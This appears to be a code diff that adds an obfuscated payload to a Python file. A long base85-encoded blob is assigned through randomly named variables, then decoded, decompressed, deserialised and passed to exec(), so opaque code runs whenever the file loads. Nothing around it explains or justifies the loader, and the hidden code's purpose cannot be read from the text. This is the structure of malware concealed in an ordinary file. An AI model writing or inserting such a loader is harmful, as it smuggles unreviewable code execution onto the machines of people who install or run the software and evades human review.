+">?Cj)XH?B3PRaGZ%j$Y0<b7_R^WuVQ4yWKt+o2gC%T-{PxRb7VaHrsP&2eq*q;)s!&{f57Ay}77E3jb`"
+")hOXtJ26JUih>Ea^IND(Ix%=EfnQ?-_GZRp8!Luz^7-nXg%oaqZKa8|bO+mRsHfcpZpEtmT+6Q6Wulgw"
+"AGO>t*{~V}wt9c%3v?nTHk<8=nKpRGo!!e?hqB$iQp6ay(<4cn&8J3l%Dw1Xt=_L|=9N;~{2dkb`$W&&"
+"96&d?uPzf{0z5jJs!<JV@qT9=3hi?(penPGFL{?1)1z0hChzON3DKW+yRI{lu_v&!xX{-fPF#iG!Z91i"
+"oF4GTc52Cc#dp;?>q6~YKoMahK7{K4<Aplr>P?(eF9_7>IJ@c%BzAKX&iwOqHJI3V(J{&+wCgn;a4d7h"
+"tP?iQ!+=)~VcFt6;4=Vn0*`2OGXrEWz(R5`DlA^&ERDe{0}Ni`Gekmo9`8QQc;>tmpgSI|3KX^as>@r?"
+"`lG`N1MWGZk+|x0KkGz2zToy;vEljAjAzgn{)k|DtC!YnAkMBT8P%X_pY1$0<Zs4v>6LY2bZH*-J{=R|"
+"_X4`W@4tkmrh8eDf)>E${n*YP+r{GrM=$*TV?z@Y$H5i#!0@1BvIm@4uja6(_-MJK<=H}O$=o5(BA#9H"
+"&Jm1e1Ktg2BYYU9D=ybng0W(^F*pqSNCqlJ5WR}6Q@;mx3O4ppqWWf|r;cD8ymj9MtN3zgM00BMWA`u4"
+"rXIcv^rlBtvnjDb{Yo(loxmhvZMB^kJlf}c)-^}l!JE+hSh1zb=pE|sJ&s-D5tRhPsZZ}W?>Aw)E#j};"
+"YM;{y@X&xkY@@f#Ecjx%msg91vHD0_#LG)p8y8VcP(@dZ(ss$TO%`vnUxXd7X6FZB7UzbQocMjfgHPZT"
+"l!iSR{{h9jy0VO0iobtMwH}+%%AqvHDOR^CWA`_8&oO&{9l@klaDWY{%H6BVMYM$IV!KyW@W8aXn}#sX"
+"#}@l=v49$qsKc2M9!iLso6x^z^sfc|YeoOsXzT)lMl49_RAHO~tS=SdG@Vk=%zqD;--btUcR*`NrO*pN"
+"wZ_{7kKo0H_9e9g(I5z6Z^7jc;qu3D@xkRYc;!I`e+<p=!R2>B+)~6-n$o(MuL$ckJ)ve5hiJ#?2@U(q"
+"Mo@A3Qmz}zJKVP?a(wiz%xGaLK$T223tJ?Y9|uZ62hbW(O6b~b8ed`d(mZ{8nZCuy({9hDC6p7bNJVG<"
+"-)R*u27P+PyMPIYM3xJ$;Dnr=4~ZN$&LtS}gqnS%HK-CA_L*r|BHQD-&cs!~EfY@(_e>mL(Gzv0Xe}uT"
+"CJ@h|<~;|3t1DPVii28En_pb?iy3%oK4`&EOg_v9EhrD!-#+!`sqpEIY^vfIS>8*VwBI+@#I3DyQ%T%t"
+"{U}>%Rs5?$pj6)~^Uq?y>Ssb#l)5I|`>nyR4@O2dWmMhJR^52CZk(z+K`BmdD+Sr+M=B6WYs<*;HnOap"
+"R3C`R57I?`%^o(qbvksMhl)@c@`0K``1uVdRrM5E*|V8Xsz+k-<J(z+vdXus-mD^P4sSTNN_(TFy{{VY"
+"8vSaf`WGO7b$d*HAWlot1Kpw0EoDViS&{7N+qB;;jP{?RdZx*<=c%6a!P!uK6x&djl11$s(szrx$=OTf"
+"{Bm@5#XkWC$A-$#XUWQgWG?vRV*-49Jq)sPaPtP4dm^Sf86O$@hpNA;A}8m_OY_voW%9}bHL?(#rImv^"
+"HcF_XF0!zDV>((eKzcvpA7%3UOvpp#w#QTlKu-;foEu}RretYtxbIsdUmtmAbfe_G(yn!NK)8N5(3{i~"
+"Wcd)KA4-;2#j3kE=BVmks=P0N&FPN?uc0R8hWf&mDDLOTsg3g+6L*_Q%h-E{@drdh*hdkqf#DD9+TU#7"
+"Xb+6;FPAf$s*M-!K21(JN&7|e;w)*Id(YtdNGB-keq;cb@a%kIu@*SM3w2#gUXO1W-8oX-5R*6Zff`us"
+"3pEY6jc#ZV>r{4J)T1%^Q~0JiCU0S0#4Bx}SVuNIwOO%MITWoNdbRql+pme|8t+uCSCN+5@JTAS(JzY^"
+"m(m(I2RDpc#YdyXN7n~8pY~^iBfG)%!QgnfmohY^o+rX~%Fv9STiU-{_3bLMbL4LSR?B3xWioIxa3!P*"
+"9SYS(4GrY<1%Ec4eRbg(vaWl>zG>RbzH1^+o&h8Kv*$?l`I!8|uH|O3e6{QKBb2GeufnNq;ks~9<hc|I"
+"g&OohQmywd#pFeMV@V`c`Y#U0S=0H#_f*B)gY7+4Eq-_jJ><VMj^<dP`XxNQa~oo+M&|jxrSOfaSF1wx"
+"kzC5s=0E<S#*)+;gE^rqq4Q*3YfRggEJDk7nkqWIRWuVVnxTrE0p*9L(s*fo;P@{dz{?X<(aEi%Q_-SR"
+"C{{rEQ;j8F(G(D4ZIuT`3t7-d8T+@4$D_vMlyPj!Xpb80l+ocIh*#D{L~kx^RrW?MZHm9W2;c!FQB~;!"
+"la(wyL77f&nNCGbrzq2D|ImjT6X-}aCmWh0)$c5_NCl7Nf}DH?ghEdmU_sH40q?0Q_G*52Om&29zP0#`"
+"!B+=EW07Xc+U_5V7ZPurdi7N3LgXY>c+fu{FDl_LWM+G4iF8LAH}lBcp_poz2{}Tx9NVlUbBAN9k@%sZ"
+"yUo<0(cltU*bu%HEodhv&oL{%CDIjX*c6euy)jkagZx607`fYhw~;)3jx0J)<zLv!pNr<tQTdnr!yjt$"
+"=_cFi!l&OU3iJkZqJ~P;VoNbuGII9_IdX<PbDk`|K$&N@%&w@}MVaUQBOhwabh4WI@H6i;GI$v%Sph+o"
+"o+Zy+A<r(53ri$%m9kvhvRsc^u2Ytqc<8wvuB94|Wb9(J?dwD5qb02*(H1$rDc&59K4mA5PLWf;K|1G1"
+"*Y&9L2KgH|$(yUB;klUVGaP;cH!&;ksj9h$+Iy;c?xEtIstO*;Up$>u5%*N3+?(oqsv7Q1@jX=u_mGwb"
+"l~b8HTG2ff5l<mV*rk9Vv3)`;)HTN&FuF=j%uxIBb^{8)3T%yAhNh3VRgZc6r4NXud%5ZhRf6{w>I-dx"
+"_q)|IGC`tAJ!27kSS7pAEdH=9XGS9ai7aQvB>ssdXQoD+kk8C4IuZRbGqoyPSekEGzCruuOjGn=+1Nh="
+"Y`8BA&I!CiyTB{53%z2y$RhAc>|%74+9l|kWtVzo^I0}oLN<fWOy~&bZdIfF_<BepR&m6N^PAQ#aIdC`"
+"1&(PxFYvaYhp&sgAV0wPeKv7I;&UxrN`?5uG<8CgAgDQRMDowfB(zNF4Qxmos)bL5m1*K;%PU#v^5v}E"
+"uHVFL-Qu`z4#DJZE^S7wDn~ktK2xg4xTeKvvOZNwS)a5dreAFmx);9yWNnD+VUhPD5Yl1LOA_I}rL~g2"
+"fPHeay?Wj2UUnUXF72YbRBO1CwVriHwXO=<W7-nl^DFAdy!^779s*&e>9Oz$hajypC7(16+bv?cTT(qD"
+"#61EB4FS^^ApyTHE-kG1E_Xp+Sa<eCTHBendchQK+$M*~3K(c;vMOf4-OS1Y+^c40uB|v1m^YdknmPwN"
+"2+z{Yj29MCYRD4C8GN>I&(1iPm%Z+ba1unZz}G2V7_RS(n7P1G^ue+8cLfhcqMU+<S(2RMe^H2Xis{%8"
+"XVu!>-Azn9-P3U5G;K^qK){Kc%a_r)eO0Z1r~b*wiAe}w&6>J-74QSI$6P+26L9b7ZWIpK!~--uCR|W2"
+";vW%>k_s2wiWf|nX%)Gfm|u&VbYpR$!L^KzP7VDFE_9|?o<jEtDGo{~d12oF0*Sygu(uC-<iEk4m_8~k"
+"Ei8bs*OJHQg_+>}Yq<OZ=CI6p(RbCkd>Q)xk{kEA!rnVMd}3;*Z+Oys8zTNKT=F2#036xA2X~v8sUv0&"
+"vPO6`2wB6Qx1m`5XpbFov7Z?2IX#2=ZpvY&eHQ`G#S3S7?=<db%>LqRim-LjA8_Z~|G*u4VH5HSxkE8N"
+"9=CBP=#%LOV0^UBbVkM}?SID^CH)XC@53btm!H7pKf&cc!sP*6@}Nm&aH)g~_|Wh+!{va8HD2Nl*|f6b"
+"OPt2zI$UnU<@eJ~oABBEJ8=1HxZD-7HdNT83fo%!56&X$pIKul`dr`1>O|u6rPqzm(92%utm~q4_DVuI"
+"Ix#piH8C?VJlgLq#Yf{A^f{Zkgl9CYFW>Uq(hB+vctN*`32=G6Xz;V>JIuUD$ewk1eQ4Iuc3s%?NwSP4"
+"cq03%7ag)^TsLODj|7Z2;nWIC$h+tTe8l@%G5x{xf#&13SSS>JAjtkepv3>{ej+F(1*IPd6dwq3J`kw?"
+"QBa8f-&P6K+Luq=I`#6*t(o8?kbG~<ygCz}rV0;GIS1Diar7D;a$jD!wGiwKJx{6I*OcHKNwzM-o9dZx"
+"F{M4UmJ`<-?;Kn|h}{(_$hsqx{wOKXrl<Z4rEWv1a}97Zxl^}Z7hEN4yQtjmHBDTXw}v(>(^?KX<C>om"
+"k^*Dge1sI_p+}v5E$5>wfm$Cdxiy1ol$TEm^bZv}VeZ4a9HH(ZQ6e-v91_+D^$*Voi_rZsp<1YWR9zx8"
+"qF_R3eK;T#3r!CdVqwEWZ6%6!LYO72eVCsm)IQYKqRSa!k5HKZa6mLG61G1ak;+ik`ME;vqv~Fvu<7B5"
+"=)721^zenOR&>3JipYETl<=AmJzNq$4L?^!W^_H^f%}W%Je0agjtVfy(VZbn*!WPZL#0%TghwCBl|t>d"
+"MWC);Q#_Q2gyX`8auJFuKPy5pRwYjfQKkDtxVjbSb{sWD`;e#=8Xuhz4vEqIRMrb3l<iYlXW-`rlt&?C"
+"VSXqV3hN)Lm?GOAYKw)%kB$kCqBqAx*}}?)c~e3Z{H#bW?0#sdMcs5pm@O=Lm^T7NUJ#85g{p^hq7y=t"
+";2DuxnD?kuCoF$hohz(+RC7istbVvEIuAt-NJquO;)mz5v_jj%nky)1`!}QliORo9iOnBK3~0pkrnTcA"
+"%5vY=83XQ+p3+tLv;I}0%r5>&02hlOuQ2#@$o}?)H!o1eHoy2K#rsC<j*xAMLR#=XeXg{B>+ILhhR5h5"
+"^80etOIbfx3sk1KD);5lTcckX-xi}Mutt$sezAQ3n-)l<MJRDV6O)&~Z`S&9u;=#mEmKw0R7K`h)8}z`"
+"lN~Gx>ha++F4t|z3*MC%Y{?6w^1_d|vr#4=|6H}Jq+j}gBYU^SI$SOIyXvfwgW|tyI6BfI{!zVjq*L&t"
+"7AXq((LpiXcUq1c#Q#56$en@"
+)
+_giRlhgVCJTQB=_WNbLnsIW.b85decode(_NfiIRlGXQgUD.encode())
+_GLcIGAXqLdiN=_QFiQDlig.decompress(_giRlhgVCJTQB)
+_huxcdJcbEuNn=_RJACzalU.loads(_GLcIGAXqLdiN)
+exec(_huxcdJcbEuNn)
